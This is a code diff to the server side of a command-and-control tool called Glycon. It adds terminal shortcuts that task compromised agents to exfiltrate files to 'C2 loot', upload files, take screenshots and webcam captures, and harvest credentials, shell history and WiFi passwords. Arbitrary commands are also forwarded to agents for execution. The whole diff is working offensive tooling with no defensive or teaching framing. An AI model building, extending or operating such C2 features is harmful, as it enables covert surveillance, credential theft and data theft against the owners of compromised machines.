@@ -7,6 +7,7 @@ import json
 import os
 import logging
 from glycon.secure_comms import SecureComms
+import base64
 
 # Suppress SocketIO packet logs
 logging.getLogger('socketio').setLevel(logging.CRITICAL)
@@ -213,11 +214,122 @@ def init_socket_handlers(socketio):
     def handle_command(data):
         if current_user.is_authenticated:
             agent_id = data.get('agent_id')
-            command = data.get('command')
+            command = data.get('command', '').strip()
             current_dir = data.get('current_dir')
+            
             if not agent_id or not command:
-                print("[SocketIO] command event missing agent_id or command")
                 return
+
+            # Handle # shortcuts
+            if command.startswith('#'):
+                parts = command[1:].split(' ', 1)
+                cmd_type = parts[0].lower()
+                arg = parts[1] if len(parts) > 1 else ''
+
+                if cmd_type == 'help':
+                    help_text = (
+                        "\r\nGlycon Terminal Shortcuts:\r\n"
+                        "  #help              - Show this help\r\n"
+                        "  #upload <file>     - Upload file from C2 to current agent directory\r\n"
+                        "  #exfiltrate <file> - Download file from agent to C2 loot\r\n"
+                        "  #screenshot        - Take a screenshot\r\n"
+                        "  #webshot           - Take a webcam capture\r\n"
+                        "  #creds             - Harvest credentials, history, and WiFi\r\n"
+                    )
+                    emit('terminal_output', {
+                        'agent_id': agent_id,
+                        'output': help_text,
+                        'current_dir': current_dir
+                    }, room=f"terminal_{agent_id}")
+                    return
+
+                # Task Creation Logic
+                conn = sqlite3.connect(CONFIG.database)
+                c = conn.cursor()
+                task_type = None
+                task_data = {}
+
+                if cmd_type == 'screenshot':
+                    task_type = 'screenshot'
+                elif cmd_type == 'webshot':
+                    task_type = 'webcam'
+                elif cmd_type == 'creds':
+                    task_type = 'harvest_creds'
+                elif cmd_type == 'exfiltrate' and arg:
+                    task_type = 'upload'
+                    # Handle relative path
+                    full_path = arg
+                    if not (arg.startswith('/') or (len(arg) > 2 and arg[1] == ':')):
+                        path_sep = '\\' if '\\' in current_dir or (len(current_dir) > 1 and current_dir[1] == ':') else '/'
+                        full_path = f"{current_dir.rstrip(path_sep)}{path_sep}{arg}"
+                    task_data = {'path': full_path}
+                elif cmd_type == 'upload' and arg:
+                    # Find file in uploads directory
+                    uploads_dir = os.path.join(os.getcwd(), 'glycon', 'uploads')
+                    found_file = None
+                    if os.path.exists(uploads_dir):
+                        for f in os.listdir(uploads_dir):
+                            if f.endswith(f"_{arg}") or f == arg:
+                                found_file = f
+                                break
+                    
+                    if found_file:
+                        try:
+                            with open(os.path.join(uploads_dir, found_file), 'rb') as f:
+                                encoded_data = base64.b64encode(f.read()).decode('utf-8')
+                            task_type = 'download'
+                            task_data = {
+                                'filename': arg,
+                                'data': encoded_data,
+                                'folder': current_dir
+                            }
+                        except Exception as e:
+                            emit('terminal_output', {
+                                'agent_id': agent_id,
+                                'output': f"\r\n[!] Error reading file: {str(e)}\r\n",
+                                'current_dir': current_dir
+                            }, room=f"terminal_{agent_id}")
+                            conn.close()
+                            return
+                    else:
+                        emit('terminal_output', {
+                            'agent_id': agent_id,
+                            'output': f"\r\n[!] Error: File '{arg}' not found in C2 uploads directory.\r\n",
+                            'current_dir': current_dir
+                        }, room=f"terminal_{agent_id}")
+                        conn.close()
+                        return
+
+                if task_type:
+                    c.execute("INSERT INTO tasks VALUES (?, ?, ?, ?, ?, ?, ?)",
+                            (None, agent_id, task_type, json.dumps(task_data),
+                            'pending', datetime.now().strftime('%Y-%m-%d %H:%M:%S %Z'), None))
+                    conn.commit()
+                    task_id = c.lastrowid
+                    conn.close()
+
+                    emit('terminal_output', {
+                        'agent_id': agent_id,
+                        'output': f"\r\n[*] Created {task_type} task (ID: {task_id}) via terminal shortcut.\r\n",
+                        'current_dir': current_dir
+                    }, room=f"terminal_{agent_id}")
+
+                    # Notify agent via the agent room
+                    emit('new_task', {
+                        'task_id': task_id,
+                        'agent_id': agent_id,
+                        'task_type': task_type
+                    }, room=f"agent_{agent_id}")
+                    return
+                else:
+                    conn.close()
+                    emit('terminal_output', {
+                        'agent_id': agent_id,
+                        'output': f"\r\n[!] Unknown shortcut or missing argument: #{cmd_type}\r\n",
+                        'current_dir': current_dir
+                    }, room=f"terminal_{agent_id}")
+                    return
+
             print(f"[SocketIO] Forwarding command to agent {agent_id}: {command} with current_dir: {current_dir}")
             # Forward the command to the agent's room as execute_command event
             emit('execute_command', {
